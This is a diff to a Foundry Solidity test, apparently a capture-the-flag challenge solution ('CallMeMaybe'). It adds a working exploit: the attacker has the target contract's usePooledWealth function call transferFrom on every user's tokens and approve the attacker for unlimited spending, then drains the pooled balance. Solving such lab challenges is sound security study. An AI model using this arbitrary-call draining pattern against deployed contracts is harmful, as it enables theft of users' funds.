@@ -21,10 +21,30 @@ contract CallMeMaybeTest is Test {
 
     function test_GetThisPassing_2() public {
         address hacker = address(0xBAD);
+        address targetAddr = address(target);
 
         uint256 startBalance = token.balanceOf(hacker);
         
         vm.startPrank(hacker);
+
+        target.joinGroup(0);
+        for (uint256 i; i < users.length; i++) {
+            bytes memory params = abi.encodeWithSignature(
+                "transferFrom(address,address,uint256)",
+                users[i],
+                targetAddr,
+                token.balanceOf(users[i])
+            );
+            target.usePooledWealth(params, address(token));
+        }
+
+        bytes memory params = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            hacker,
+            type(uint256).max
+        );
+        target.usePooledWealth(params, address(token));
+        token.transferFrom(targetAddr, hacker, token.balanceOf(targetAddr));
 
         vm.stopPrank();
         
